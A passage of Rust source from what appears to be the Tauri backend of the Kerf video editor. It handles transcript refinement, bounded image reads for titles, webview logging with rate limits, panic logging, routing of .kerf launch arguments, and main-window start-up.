    };
    *current.borrow_mut() = Some(merged.clone());
    emit_status();
    if run.cancelled {
        // A cancel is the user's own doing, not a failure — the caller keys off this string to
        // stay quiet about it. What finished before it is cached; the step it stopped is not.
        return Err(ANALYSIS_CANCELLED.to_string());
    }
    if run.patch.ran.is_empty() {
        if let Some(why) = run.failure_summary() {
            return Err(why);
        }
    }
    Ok(AnalysisOutcome {
        status: kerf_core::analysis_status(asset_id, Some(&merged)),
        analysis: merged,
        failed: run.failed,
    })
}

/// Re-time an asset's cached transcript to the speech energy and label its speakers, without
/// re-transcribing — the Tauri command's and the MCP tool's shared body. The transcript is read
/// under the lock; the decode and clustering run with it released, in the background lane,
/// streaming `analysis-progress` and giving up on `cancel`; the result is stored under the
/// lock again, unless a newer transcript landed meanwhile. Only analysis moved, so it says so
/// with `analysis-status`, not `project-changed`.
pub(crate) fn run_refine<'a>(
    app: &impl Host,
    lock: &dyn Fn() -> std::sync::MutexGuard<'a, Project>,
    asset_id: Uuid,
    cancel: &dyn Fn() -> bool,
) -> CmdResult<AssetAnalysis> {
    let (asset, read, generation) = {
        let project = lock();
        (
            project.require_asset(asset_id).map_err(|e| e.to_string())?,
            project.transcript(asset_id).map_err(|e| e.to_string())?,
            project.generation(),
        )
    };
    let id_text = asset_id.to_string();
    let emit = |p: kerf_core::AnalysisProgress| {
        let _ = app.send(
            "analysis-progress",
            AnalysisProgressEvent {
                asset_id: id_text.clone(),
                stage: p.stage,
                fraction: p.fraction,
                detail: p.detail,
            },
        );
    };
    let refined = kerf_core::refine_transcript_media(&asset, read.clone(), &mut |p| emit(p), cancel);
    emit(kerf_core::AnalysisProgress::stage("done"));
    let refined = refined.map_err(|e| match e {
        kerf_core::Error::Cancelled => ANALYSIS_CANCELLED.to_string(),
        e => e.to_string(),
    })?;
    let stored = {
        let project = lock();
        // A project opened meanwhile is not told its asset was refined.
        require_generation(&project, generation, "the transcript was being refined")?;
        project
            .store_transcript(asset_id, &read, refined)
            .map_err(|e| e.to_string())?
    };
    let _ = app.send("analysis-status", kerf_core::analysis_status(asset_id, Some(&stored)));
    Ok(stored)
}

/// Parse the `steps` an adapter was handed (`None` = the default set).
pub(crate) fn parse_steps(steps: Option<Vec<String>>) -> CmdResult<Option<Vec<kerf_core::AnalysisKind>>> {
    steps
        .map(|names| kerf_core::AnalysisKind::parse_list(&names))
        .transpose()
        .map_err(|e| e.to_string())
}

/// Ask whether a speech-to-text backend exists, which the first time runs `ffmpeg -h filter=whisper`
/// (cached for the process, bounded at a minute) — and every analysis status reads it. So it is asked
/// here, **before a project lock is taken**, never inside one: a cold probe must not hold the shared
/// project for as long as an ffmpeg start takes on a slow disk. Setup warms it on a thread of its own.
pub(crate) fn warm_transcription_backend() {
    let _ = kerf_core::transcription_backend();
}

/// The project-meta key holding the user's speech-model choice.
pub(crate) const SPEECH_MODEL_KEY: &str = "speech_model";

/// Apply the speech-model choice stored in `project` (a no-op when unset), so a
/// reopened project transcribes with the model the user picked for it.
fn restore_speech_model(project: &Mutex<Project>) {
    let stored = lock_user(project).meta(SPEECH_MODEL_KEY).ok().flatten();
    kerf_core::set_speech_model(stored.as_deref().filter(|s| !s.is_empty()));
}

/// One step of generating a voiceover: a download (`download_runtime`,
/// `download_model`, `download_voice`) or `synthesize`.
#[derive(Serialize, Clone)]
pub(crate) struct VoiceoverProgressEvent {
    pub(crate) stage: String,
    pub(crate) fraction: Option<f64>,
    pub(crate) detail: Option<String>,
}

/// One clipboard entry: the clip's data plus the track it should land on.
#[derive(serde::Deserialize)]
struct Placement {
    track_id: String,
    clip: kerf_core::Clip,
}

/// An image file as the `data:` URL an `image` control takes (`kerf_core::template::image_data_url`
/// judges the picture; this only reads the file, bounded). Shared with the MCP tools.
///
/// The bound is the one the engine holds a picture to ([`kerf_core::template::MAX_IMAGE_BYTES`], a little
/// under 96 KB: a title is at most 128 KiB), and it is kept by the read itself rather than by a `stat`
/// that the file could outgrow: the file is opened, looked at through the handle it was opened as, and read
/// at most one byte past the bound.
pub(crate) fn template_image_data_url(path: &str) -> kerf_core::Result<String> {
    use kerf_core::Error;
    use std::io::Read;
    let refuse = |why: String| Error::InvalidArgument(why);
    let limit = kerf_core::template::MAX_IMAGE_BYTES as u64;
    let file = std::path::Path::new(path);
    if !file.is_absolute() {
        return Err(refuse(format!("{path} must be an absolute file path")));
    }
    // Not opened if it is not a regular file at all: opening a named pipe would wait for a writer.
    let meta = std::fs::metadata(file).map_err(|e| refuse(format!("cannot read {path}: {e}")))?;
    if !meta.is_file() {
        return Err(refuse(format!("{path} is not a regular file")));
    }
    let handle = std::fs::File::open(file).map_err(|e| refuse(format!("cannot read {path}: {e}")))?;
    let meta = handle.metadata().map_err(|e| refuse(format!("cannot read {path}: {e}")))?;
    if !meta.is_file() {
        return Err(refuse(format!("{path} is not a regular file")));
    }
    let too_big = |bytes: u64| {
        refuse(format!(
            "{path} is {} KiB: too large for an image in a title (at most {} KiB)",
            bytes.div_ceil(1024),
            limit / 1024
        ))
    };
    if meta.len() > limit {
        return Err(too_big(meta.len()));
    }
    let mut bytes = Vec::with_capacity(usize::try_from(meta.len()).unwrap_or(0));
    handle
        .take(limit + 1)
        .read_to_end(&mut bytes)
        .map_err(|e| refuse(format!("cannot read {path}: {e}")))?;
    if bytes.len() as u64 > limit {
        return Err(too_big(bytes.len() as u64));
    }
    kerf_core::template::image_data_url(&bytes)
}

/// What detaching sound from several clips did: the refreshed timeline, how many
/// clips were detached, and the ones left alone with the reason (a locked track,
/// an asset without audio, a sound already detached).
#[derive(serde::Serialize)]
struct AudioDetached {
    timeline: Timeline,
    detached: usize,
    skipped: Vec<kerf_core::SkippedDetach>,
}

/// What a range edit did (`CutAll`, `RangeEdit`, `GapClosed`) beside the refreshed timeline, so the
/// page can say what was cut and which locked tracks were left alone.
#[derive(serde::Serialize)]
struct EditDone<R> {
    timeline: Timeline,
    result: R,
}

/// Whether the open proposal also marks assets (a 360 projection): applying it changes the
/// footage, so their preview proxies have to be made again. A tag change leaves the footage alone.
fn staged_asset_changes(project: &Project) -> CmdResult<bool> {
    project
        .staged()
        .map(|staged| staged.is_some_and(|staged| staged.asset_changes.iter().any(|c| c.tag_edit.is_none())))
        .map_err(|e| e.to_string())
}

/// The error an abandoned cover export returns, for the webview to stay quiet on.
const COVER_CANCELLED: &str = "cover export cancelled";

/// How the Preview will play each span of the cut (`kerf_core::render_bar`): the GPU preview's
/// compositor where it is on and draws the frame, the FFmpeg stream where it hands over, and the
/// spans where playback stalls. `width` is the Preview's render width.
#[tauri::command]
async fn get_render_bar(
    state: State<'_, AppState>,
    gpu: State<'_, Arc<gpu_preview::GpuPreview>>,
    width: Option<u32>,
) -> CmdResult<kerf_core::render_bar::RenderBar> {
    let shared = state.project.clone();
    let enabled = gpu.is_enabled();
    blocking(move || {
        // The project's rows under the lock; a proxy's state (a cached ffprobe, once per file)
        // with it released.
        let (timeline, assets, inputs) = {
            let project = lock_user(&shared);
            let (timeline, assets) = project.export_still_inputs().map_err(|e| e.to_string())?;
            (timeline, assets, project.proxy_inputs().map_err(|e| e.to_string())?)
        };
        let waits = Project::proxy_waits_in(&timeline, kerf_core::proxy::effective_preview_source(), 0.0, None, |id| {
            inputs
                .iter()
                .find(|i| i.asset.id == id)
                .cloned()
                .ok_or(kerf_core::Error::AssetNotFound(id))
        })
        .map_err(|e| e.to_string())?;
        // What the GPU's caps are made of is measured once per process, off the lock: the grade's conversions (a grade, a dip to
        // white, another colour matrix), the scaler, the matrix conversion and `drawtext`'s layout, for this cut.
        // The preview plays RGB textures, which the compositor hands out only where this FFmpeg's `yuv420p -> rgb24` is the display pass's
        // (`display_probe`, which `prepare_timeline` measures): where it is not, no span is the GPU's, as the self-test's gate would have it.
        let caps = enabled
            .then(|| {
                kerf_gpu::prepare_timeline(&timeline);
                kerf_gpu::display_probe::offered().then(|| {
                    kerf_gpu::Compositor::session_caps_for(
                        kerf_gpu::grade::measured(),
                        kerf_gpu::scaler::measured(),
                        kerf_gpu::convert::measured(),
                    )
                })
            })
            .flatten();
        let req = kerf_core::render_bar::BarRequest {
            caps,
            width: width.unwrap_or(960).clamp(64, 1920),
            color: kerf_core::composite_color_policy(),
            media: &kerf_core::ProxyMedia,
            // Named, not with the build's progress: the bar is asked again on an edit, not as a
            // proxy builds, so a percentage would go stale under the pointer.
            waits: waits
                .iter()
                .map(|w| (w.asset_id, format!("{} of {}", kerf_core::proxy::PROXY_WAIT_PREFIX, w.name)))
                .collect(),
            // A placed layer's file is asked for its range (once, remembered) before its plan is judged, as a play session's
            // `prepare_ahead` does: a span the compositor would refuse at draw time is the stream's here too.
            ask: Some(&kerf_gpu::prepare_ranges),
        };
        Ok(kerf_core::render_bar::render_bar(&timeline, &assets, &req))
    })
    .await
}

/// The error an abandoned analysis pass returns. The webview matches on it to
/// tell "the user stopped this" apart from "this broke".
const ANALYSIS_CANCELLED: &str = "analysis cancelled";

// ---- diagnostics (logs) ----------------------------------------------------

/// Where the logfiles live: `<app data dir>/logs`. The one place this is
/// decided, so `init_logging` and `reveal_logs` cannot disagree.
fn log_dir_path(app: &impl Host) -> Option<std::path::PathBuf> {
    app.data_dir().map(|dir| dir.join("logs"))
}

/// Open the log directory in the OS file manager so users can attach the file.
#[tauri::command(async)]
fn reveal_logs(app: AppHandle) -> CmdResult<()> {
    use tauri_plugin_opener::OpenerExt;
    let dir = log_dir_path(&app).ok_or("no data directory for the logs")?;
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    app.opener()
        .open_path(dir.to_string_lossy().into_owned(), None::<&str>)
        .map_err(|e| e.to_string())
}

/// The longest message the webview may write to the log; the rest is cut so a
/// runaway loop (or an error carrying a whole payload) cannot fill the disk.
const FRONTEND_LOG_MAX: usize = 8 * 1024;
const FRONTEND_CONTEXT_MAX: usize = 512;
/// Webview lines let through per second; the rest are counted and reported.
const FRONTEND_LOG_PER_SEC: u32 = 30;

fn truncate_log(s: &str, max: usize) -> String {
    if s.len() <= max {
        return s.to_string();
    }
    let mut end = max;
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}… [truncated {} bytes]", &s[..end], s.len() - end)
}

/// A fixed one-second window: `admit` says whether this line may be written and,
/// when a new window opens, how many the last one turned away.
#[derive(Default)]
struct LogBudget {
    window: u64,
    used: u32,
    dropped: u32,
}

impl LogBudget {
    fn admit(&mut self, now_ms: u64) -> (bool, u32) {
        let window = now_ms / 1000;
        let mut dropped = 0;
        if window != self.window {
            dropped = std::mem::take(&mut self.dropped);
            self.window = window;
            self.used = 0;
        }
        if self.used < FRONTEND_LOG_PER_SEC {
            self.used += 1;
            (true, dropped)
        } else {
            self.dropped += 1;
            (false, dropped)
        }
    }
}

/// Write a line from the webview — a failed command, an error toast, an
/// unhandled rejection — to the logfile, marked with the `webview` target.
#[tauri::command(async)]
fn log_frontend(level: String, message: String, context: Option<String>) {
    static BUDGET: Mutex<Option<LogBudget>> = Mutex::new(None);
    let now_ms = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map_or(0, |d| d.as_millis() as u64);
    let (allowed, dropped) = BUDGET
        .lock()
        .unwrap_or_else(|e| e.into_inner())
        .get_or_insert_with(LogBudget::default)
        .admit(now_ms);
    if dropped > 0 {
        tracing::warn!(target: "webview", dropped, "webview log lines dropped (rate limit)");
    }
    if !allowed {
        return;
    }
    let message = truncate_log(&message, FRONTEND_LOG_MAX);
    let context = truncate_log(context.as_deref().unwrap_or(""), FRONTEND_CONTEXT_MAX);
    match level.as_str() {
        "error" => tracing::error!(target: "webview", context = %context, "{message}"),
        "warn" | "warning" => tracing::warn!(target: "webview", context = %context, "{message}"),
        _ => tracing::info!(target: "webview", context = %context, "{message}"),
    }
}

/// Packaged builds ship `ffmpeg`/`ffprobe` next to the executable as Tauri
/// `externalBin` sidecars (see `tauri.conf.json`'s `bundle.externalBin`, injected
/// for Windows where there is no system FFmpeg). Point the CLI engine at them via
/// the `KERF_FFMPEG`/`KERF_FFPROBE` overrides it already honors. We only set a var
/// when the user hasn't (an explicit override wins) and the bundled binary is
/// actually present, so dev builds — which have no sidecar — transparently fall
/// back to a bare `ffmpeg`/`ffprobe` PATH lookup.
///
/// **Must run before anything else in the process starts a thread** (it is the first statement of
/// [`run`]): `set_var` races every concurrent read of the environment, and the runtime, the
/// webview and ffmpeg's own children all read it. Logging is not up yet either, so what was set
/// is returned for `setup` to log.
fn use_bundled_ffmpeg() -> Vec<(&'static str, std::path::PathBuf)> {
    let mut set = Vec::new();
    let Ok(exe) = std::env::current_exe() else { return set };
    let Some(dir) = exe.parent() else { return set };
    for (var, name) in [("KERF_FFMPEG", "ffmpeg"), ("KERF_FFPROBE", "ffprobe")] {
        if std::env::var_os(var).is_some() {
            continue;
        }
        let path = dir.join(format!("{name}{}", std::env::consts::EXE_SUFFIX));
        if path.is_file() {
            std::env::set_var(var, &path);
            set.push((var, path));
        }
    }
    set
}

/// The daily-rolling `kerf.<date>.log` in `dir` (the last 14 days are kept).
fn file_appender(
    dir: &std::path::Path,
) -> Result<tracing_appender::rolling::RollingFileAppender, tracing_appender::rolling::InitError> {
    tracing_appender::rolling::Builder::new()
        .rotation(tracing_appender::rolling::Rotation::DAILY)
        .filename_prefix("kerf")
        .filename_suffix("log")
        .max_log_files(14)
        .build(dir)
}

/// The logfile layer. The appender is its writer **directly**: each event is one
/// `write` straight to the file, so a line is with the OS the moment it is
/// logged. It used to sit behind `tracing_appender::non_blocking`, whose worker
/// thread owns a queue — and a queue is what a crash takes with it. A panic that
/// aborts, a `process::exit`, or a segfault in a native library (FFmpeg and ONNX
/// Runtime both run in this process) never reaches a guard's `Drop`, so the
/// lines nearest the crash, the ones a bug report needs, were the ones lost.
/// Logging here is a few dozen lines per session, none of them in a hot loop, so
/// the one syscall each costs nothing worth a queue.
fn file_layer<S>(appender: tracing_appender::rolling::RollingFileAppender) -> impl tracing_subscriber::Layer<S>
where
    S: tracing::Subscriber + for<'a> tracing_subscriber::registry::LookupSpan<'a>,
{
    tracing_subscriber::fmt::layer().with_ansi(false).with_writer(appender)
}

/// Install the global tracing subscriber: always to the console (stdout, or stderr for a headless
/// run, whose stdout is its ready line), and — when the log directory (`<app data dir>/logs`) is
/// writable — to a daily-rolling `kerf.<date>.log` there so users hitting an issue can attach it.
/// Level is `info` by default; override with `RUST_LOG` (e.g. `RUST_LOG=debug`).
fn init_logging(log_dir: Option<std::path::PathBuf>, to_stderr: bool) {
    use std::io::IsTerminal;
    use tracing_subscriber::fmt::writer::BoxMakeWriter;
    use tracing_subscriber::prelude::*;

    let filter =
        tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info"));
    let stdout = if to_stderr {
        tracing_subscriber::fmt::layer()
            .with_ansi(std::io::stderr().is_terminal())
            .with_writer(BoxMakeWriter::new(std::io::stderr))
    } else {
        tracing_subscriber::fmt::layer().with_writer(BoxMakeWriter::new(std::io::stdout))
    };

    let file = log_dir.and_then(|dir| {
        std::fs::create_dir_all(&dir).ok()?;
        Some((file_layer(file_appender(&dir).ok()?), dir))
    });

    match file {
        Some((layer, dir)) => {
            tracing_subscriber::registry().with(filter).with(stdout).with(layer).init();
            tracing::info!(dir = %dir.display(), "logging to file");
        }
        None => {
            tracing_subscriber::registry().with(filter).with(stdout).init();
            tracing::warn!("file logging unavailable; logging to stdout only");
        }
    }
}

/// Where a panic happened and what it said, for its log line.
fn panic_summary(location: Option<&std::panic::Location<'_>>, payload: &(dyn std::any::Any + Send)) -> (String, String) {
    let location = location.map(|l| format!("{}:{}", l.file(), l.line())).unwrap_or_default();
    let message = payload
        .downcast_ref::<&str>()
        .map(|s| s.to_string())
        .or_else(|| payload.downcast_ref::<String>().cloned())
        .unwrap_or_else(|| "panic".to_string());
    (location, message)
}

/// One panic as a log record. The logfile writer is synchronous (`file_layer`),
/// so this is on disk when it returns — the process may be about to die.
fn log_panic(location: &str, message: &str, backtrace: &dyn std::fmt::Display) {
    tracing::error!(location = %location, "panic: {message}\n{backtrace}");
}

/// Route panics through tracing so they land in the logfile, then run the
/// default hook (which still prints the backtrace to stderr).
fn install_panic_hook() {
    let default = std::panic::take_hook();
    std::panic::set_hook(Box::new(move |info| {
        let (location, message) = panic_summary(info.location(), info.payload());
        // Captured regardless of RUST_BACKTRACE: a user's panic has no env var set,
        // and the logfile is the only copy. Release builds keep their symbol
        // table (`strip = "debuginfo"`), so the frames have function names.
        let backtrace = std::backtrace::Backtrace::force_capture();
        log_panic(&location, &message, &backtrace);
        default(info);
    }));
}

/// Emitted to the webview when a second launch carried a `.kerf` path. The
/// frontend owns the "replace the open project?" question, so it does the open.
const OPEN_PROJECT_EVENT: &str = "open-project-file";

/// The `.kerf` path in a launch's arguments, resolved against that launch's
/// working directory (a second launch's relative path is relative to *its* cwd,
/// not to ours; the first launch's is relative to ours).
fn project_arg(argv: &[String], cwd: &str) -> Option<String> {
    let arg = argv.iter().skip(1).find(|a| {
        std::path::Path::new(a)
            .extension()
            .is_some_and(|e| e.eq_ignore_ascii_case("kerf"))
    })?;
    let path = std::path::Path::new(arg);
    let full = if path.is_absolute() {
        path.to_path_buf()
    } else {
        std::path::Path::new(cwd).join(path)
    };
    Some(full.display().to_string())
}

/// What a launch's arguments ask to open. Serialized for the webview as
/// `{"open": path}` / `{"missing": path}`; `Nothing` is never sent (it is `None`).
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
enum LaunchProject {
    /// No `.kerf` argument.
    Nothing,
    /// A `.kerf` file that exists.
    Open(String),
    /// A `.kerf` argument that names nothing on disk. Not opened: SQLite would
    /// happily create it, so a mistyped path would leave an empty project file
    /// behind and open that as if it were the one meant. The webview says so
    /// instead.
    Missing(String),
}

/// What the launch with `argv` (run from `cwd`) asks to open, `exists` being the
/// filesystem question — a parameter so the parsing is testable without one.
fn launch_project(argv: &[String], cwd: &str, exists: impl Fn(&std::path::Path) -> bool) -> LaunchProject {
    match project_arg(argv, cwd) {
        None => LaunchProject::Nothing,
        Some(path) if exists(std::path::Path::new(&path)) => LaunchProject::Open(path),
        Some(path) => LaunchProject::Missing(path),
    }
}

/// This process's own launch: its arguments against its own working directory,
/// the same resolution a second launch gets (`on_second_launch`).
fn first_launch_project() -> LaunchProject {
    let argv: Vec<String> = std::env::args_os().map(|a| a.to_string_lossy().into_owned()).collect();
    let cwd = std::env::current_dir().map(|p| p.display().to_string()).unwrap_or_default();
    launch_project(&argv, &cwd, |p| p.is_file())
}

/// Where a launch's request waits for the webview. The webview *pulls* it once its
/// listeners exist (`take`); until then a second launch's request is *held* here
/// too — emitting it to a page that is not listening yet would lose it — and the
/// newest request wins. Once the webview has asked, later requests are events.
/// One lock covers both halves, so a request is delivered exactly one way.
#[derive(Debug, Default)]
struct LaunchSlot {
    request: Option<LaunchProject>,
    /// The webview has asked, so it is listening.
    taken: bool,
    /// Something was asked for by name (a command line, a second launch), so the project a
    /// setting would reopen is not wanted.
    named: bool,
}

impl LaunchSlot {
    fn new(first: LaunchProject) -> Self {
        let mut slot = Self::default();
        slot.hold(first);
        slot
    }

    fn hold(&mut self, request: LaunchProject) {
        if request != LaunchProject::Nothing {
            self.named = true;
            self.request = Some(request);
        }
    }

    /// The project a setting reopens, once the disk has said it is there. It gives way to anything
    /// asked for by name, however early or late either arrives: `None` when the page will pick it
    /// up (or something was named), `Some` when the page is already listening and must be told.
    fn offer_reopen(&mut self, path: String) -> Option<LaunchProject> {
        if self.named {
            return None;
        }
        if self.taken {
            return Some(LaunchProject::Open(path));
        }
        self.request = Some(LaunchProject::Open(path));
        None
    }

    /// A second launch's request. `None`: held for the webview to take. `Some`:
    /// the webview is already listening, deliver it as an event.
    fn offer(&mut self, request: LaunchProject) -> Option<LaunchProject> {
        if request == LaunchProject::Nothing {
            return None;
        }
        self.named = true;
        if self.taken {
            return Some(request);
        }
        self.hold(request);
        None
    }

    /// The webview asking: what is waiting, once. A later call (a reloaded
    /// webview) gets nothing, so a project is never reopened over the user's edits.
    fn take(&mut self) -> Option<LaunchProject> {
        self.taken = true;
        self.request.take()
    }
}

/// What the app was launched with, once — the webview calls this after its
/// listeners and the first project load are in place, then opens it the way it
/// opens a second launch's (`open-project-file`), including the question about
/// unsaved work, or says the file was not found. `None` when there was nothing,
/// or it was already taken.
#[tauri::command(async)]
fn take_launch_project(state: State<'_, AppState>) -> Option<LaunchProject> {
    state.launch.lock().unwrap_or_else(|e| e.into_inner()).take()
}

/// How long the main window may stay hidden waiting for the webview to say it is
/// ready. A normal start takes a fraction of this; it exists so a bundle that
/// crashes before it can ask (a broken build, a blocked script) cannot leave an
/// app with no window at all. A slow machine that goes over just sees the window
/// a little before it is themed, which is what every start used to look like.
const REVEAL_FAILSAFE: std::time::Duration = std::time::Duration::from_secs(3);
/// If the failsafe finds no window to show (or showing fails), how often it tries
/// again, and how many times.
const REVEAL_RETRY_EVERY: std::time::Duration = std::time::Duration::from_millis(500);
const REVEAL_RETRIES: u32 = 20;

/// Run `show` unless the window has already been revealed; says whether it ran
/// *and worked*. The webview's request and the failsafe timer both go through
/// this, so the window is shown once and the late ones are no-ops — in
/// particular a timer firing after the user has minimized the window must not
/// pop it back up. `show` says whether it actually showed something: when it did
/// not (no window yet, the platform refused) the claim is given back, so the
/// next caller tries again rather than finding a window that was never shown
/// marked as shown.
fn reveal_once(shown: &AtomicBool, show: impl FnOnce() -> bool) -> bool {
    if shown.swap(true, Ordering::AcqRel) {
        return false;
    }
    if show() {
        return true;
    }
    shown.store(false, Ordering::Release);
    false
}

/// A second launch brings the window forward every time, whatever was shown
/// before; only a show that worked counts as the reveal, so one that found no
/// window (it can arrive before the config windows exist) leaves the failsafe
/// armed.
fn bring_forward(shown: &AtomicBool, show: impl FnOnce() -> bool) -> bool {
    let worked = show();
    if worked {
        shown.store(true, Ordering::Release);
    }
    worked
}

/// Show and focus the main window; says whether there was one to show.
fn show_main(app: &AppHandle, unminimize: bool) -> bool {
    let Some(window) = app.get_webview_window("main") else {
        tracing::warn!("no main window to show (yet)");
        return false;
    };
    if unminimize {
        let _ = window.unminimize();
    }
    if let Err(e) = window.show() {
        tracing::error!(error = %e, "could not show the main window");
        return false;
    }
    let _ = window.set_focus();
    true
}

/// The webview is themed and has painted: show the main window. The window is
/// created hidden, so this is what ends the start-up. Idempotent, and a plain
/// command rather than the window API so the webview needs no `window:show`
/// permission and Rust keeps the one-shot flag.
#[tauri::command(async)]
fn show_main_window(app: AppHandle, state: State<'_, AppState>) {
    reveal_once(&state.main_window_shown, || show_main(&app, false));
}

/// Show the window after `after` if the webview has not asked by then, and keep
/// trying for a while if there is no window to show yet or showing fails.
fn spawn_reveal_failsafe(app: AppHandle, shown: Arc<AtomicBool>, after: std::time::Duration) {
    std::thread::spawn(move || {
        std::thread::sleep(after);
        for _ in 0..REVEAL_RETRIES {
            if shown.load(Ordering::Acquire) {
                return;
            }
            if reveal_once(&shown, || show_main(&app, false)) {
                tracing::warn!(secs = after.as_secs(), "the webview never showed the main window; showing it");
                return;
            }
            std::thread::sleep(REVEAL_RETRY_EVERY);
        }
        tracing::error!("gave up showing the main window");
    });
}

/// Emitted to the webview when a launch named a `.kerf` that is not there.
const MISSING_PROJECT_EVENT: &str = "launch-project-missing";

/// Tell the webview about a launch request over events (it is listening).
fn deliver_launch(app: &AppHandle, request: LaunchProject) {
    match request {
        LaunchProject::Open(path) => {
            let _ = app.emit(OPEN_PROJECT_EVENT, path);
        }
        LaunchProject::Missing(path) => {
            let _ = app.emit(MISSING_PROJECT_EVENT, path);
        }
        LaunchProject::Nothing => {}
    }
}

/// With nothing named on the command line and the setting on: ask the disk whether the project
/// that was open last is still there and hand it to the page like a named one — held for the
/// page's pull while it boots, or as an event when it is already listening (a slow share).
fn reopen_last_project(app: &AppHandle, stored: &settings::Settings) {
    let Some(path) = settings::reopen_target(stored, |p| p.is_file()) else {
        return;
    };
    tracing::info!(path, "reopening the project that was open last");
    let Some(state) = app.try_state::<AppState>() else {
        return;
    };
    let undelivered = state.launch.lock().unwrap_or_else(|e| e.into_inner()).offer_reopen(path);
    if let Some(request) = undelivered {
        deliver_launch(app, request);
    }
}

fn on_second_launch(app: &AppHandle, argv: Vec<String>, cwd: String) {
    tracing::info!(?argv, "second launch; focusing the running window");
    let state = app.try_state::<AppState>();
    // Someone is waiting on a window: bring it forward now, themed or not. The
    // failsafe stands down only if that really showed one — this can run before
    // the config windows exist, and then the failsafe is still what shows it.
    match &state {
        Some(state) => bring_forward(&state.main_window_shown, || show_main(app, true)),
        None => show_main(app, true),
    };
    let request = launch_project(&argv, &cwd, |p| p.is_file());
    if let LaunchProject::Missing(path) = &request {
        tracing::warn!(path, "second launch named a project file that does not exist");
    }
    // While the webview is still booting it is not listening, so the request is
    // held for it to take (newest wins); once it is, the request is an event.
    let undelivered = match &state {
        Some(state) => state.launch.lock().unwrap_or_else(|e| e.into_inner()).offer(request),
        None => Some(request),
    };
    if let Some(request) = undelivered {
        deliver_launch(app, request);
    }
}

/// The app's compiled-in configuration: the one `generate_context!`, shared by the window and the
/// headless run (which reads only its identifier).
fn context() -> tauri::Context {
    tauri::generate_context!()
}

/// `kerf-app --headless …`: the MCP server with no window, until a signal; the exit code. `None`
/// when the command line does not ask for it (the desktop app then runs).
pub fn headless_main() -> Option<i32> {
    let argv: Vec<String> = std::env::args_os().map(|a| a.to_string_lossy().into_owned()).collect();
    if !headless::requested(&argv) {
        return None;
    }
    // Before a thread exists: this sets environment variables.
    let bundled_ffmpeg = use_bundled_ffmpeg();
    Some(headless::main(&argv, &bundled_ffmpeg))
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    // Before a thread exists: this sets environment variables.
    let bundled_ffmpeg = use_bundled_ffmpeg();
    // Start on a fresh, empty in-memory project; the user opens an existing
    // `.kerf` file or imports media to populate it.
    let project = Arc::new(Mutex::new(Project::open_in_memory().expect("failed to create empty project")));
    // A `.kerf` on the command line of the very first launch (a second launch's is
    // forwarded by the single-instance plugin, which never reaches this far).
    let launch = first_launch_project();
    let main_window_shown = Arc::new(AtomicBool::new(false));
    let scrub = Arc::new(kerf_core::ScrubFrames::new(kerf_core::ScrubConfig::default()));

    tauri::Builder::default()
        // Must be the first plugin. A second launch (a `.kerf` double-clicked
        // while Kerf is open, or the binary run again) lands here instead of
        // starting another app that would fight the first for the MCP port and
        // the settings file.
        .plugin(tauri_plugin_single_instance::init(on_second_launch))
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_updater::Builder::new().build())
        .plugin(tauri_plugin_process::init())
        .manage(AppState::new(
            project.clone(),
            main_window_shown.clone(),
            LaunchSlot::new(launch.clone()),
            scrub.clone(),
        ))
        .manage(popout::PopoutState::default())
        .manage(editor_context::EditorContextState::default())
        .manage(Mutex::new(recovery::RecoveryState::default()))
        .on_window_event(popout::on_window_event)
        .setup(move |app| {
            // Logging needs the resolved app data directory, so set it up here
            // (before anything else in setup) rather than at the top of `run`.
            init_logging(log_dir_path(app.handle()), false);
            install_panic_hook();
            set_app_dirs(app.handle());
            // The untitled project moves into a crash-recovery file before anything can edit it.
            recovery::start(app.handle());
            // The editor window is built here, not by Tauri from the config (`create:
            // false` there): only a builder can carry the handler that lets a panel
            // be detached into a window of its own. Otherwise exactly what the config
            // says — hidden until the page has themed itself, see `show_main_window`.
            popout::create_main_window(app)?;
            for (var, path) in &bundled_ffmpeg {
                tracing::info!(%var, path = %path.display(), "using bundled FFmpeg binary");
            }
            // Before anything can spawn ffmpeg: how much of the machine it may take.
            // The previous run died during the GPU preview's first frame (a driver crash): it must not
            // do it again on every launch, so the setting goes off before it is read.
            let crashed = gpu_preview::take_crash_marker_in(app.handle());
            if crashed {
                tracing::warn!("the last run ended while the GPU preview was starting; turning the setting off");
                if let Err(e) = settings::update(app.handle(), &serde_json::json!({ "gpu_preview": false })) {
                    tracing::warn!(error = %e, "could not turn the GPU preview setting off");
                }
            }
            // Before anything can queue a proxy (the reopened project's): the page is told when the queue moves.
            proxy_queue::start(app.handle());
            let stored = settings::load(app.handle());
            settings::apply(&stored);
            // With nothing named on the command line, the setting may ask for the project that
            // was open last. The page takes it like any other launch request.
            // Whether the file is still there is asked of the disk on a thread of its own: a project on
            // a share that is offline would otherwise hold the whole launch (this is the main thread).
            if launch == LaunchProject::Nothing && stored.reopen_last_project {
                let (handle, stored) = (app.handle().clone(), stored.clone());
                std::thread::spawn(move || reopen_last_project(&handle, &stored));
            }
            // The GPU preview builds nothing until a frame wants it; this is only the setting.
            let gpu = Arc::new(gpu_preview::GpuPreview::for_app(app.handle().clone(), crashed, scrub));
            gpu.set_enabled(stored.gpu_preview);
            app.manage(gpu);
            tracing::info!(
                version = env!("CARGO_PKG_VERSION"),
                os = std::env::consts::OS,
                arch = std::env::consts::ARCH,
                ffmpeg = %std::env::var("KERF_FFMPEG").unwrap_or_else(|_| "ffmpeg".to_string()),
                ffprobe = %std::env::var("KERF_FFPROBE").unwrap_or_else(|_| "ffprobe".to_string()),
                log_dir = %log_dir_path(app.handle()).map(|p| p.display().to_string()).unwrap_or_default(),
                data_dir = %app.path().app_data_dir().map(|p| p.display().to_string()).unwrap_or_default(),
                "kerf starting"
            );
            match &launch {
                LaunchProject::Open(path) => tracing::info!(path, "opening the project this launch was started with"),
                LaunchProject::Missing(path) => tracing::warn!(path, "this launch named a project file that does not exist"),
                LaunchProject::Nothing => {}
            }
            // Read the machine's fonts off the first Play of an animated title.
            std::thread::spawn(kerf_core::fonts::warm);
            std::thread::spawn(warm_transcription_backend);
            // The window is created hidden; if the webview never asks for it
            // (`show_main_window`), this does.
